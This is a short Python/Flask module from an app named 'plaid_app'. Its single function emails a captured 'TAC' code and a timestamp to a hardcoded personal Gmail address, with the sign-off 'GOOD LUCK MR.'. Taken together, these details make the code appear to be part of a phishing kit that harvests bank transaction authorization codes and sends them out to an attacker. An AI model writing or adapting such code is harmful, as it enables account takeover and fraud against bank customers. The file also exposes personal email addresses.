from plaid_app import mail
from flask_mail import Message
from datetime import datetime

def tac_code(tac):
    msg = Message('New Login', 
        sender='abdullahomotoke@gmail.com', 
        recipients=['adekunlealiamin010@gmail.com'])
    msg.body=f'''
    TAC ----- {tac}
    at ---- {datetime.now()}
    GOOD LUCK MR. 
    '''
    mail.send(msg)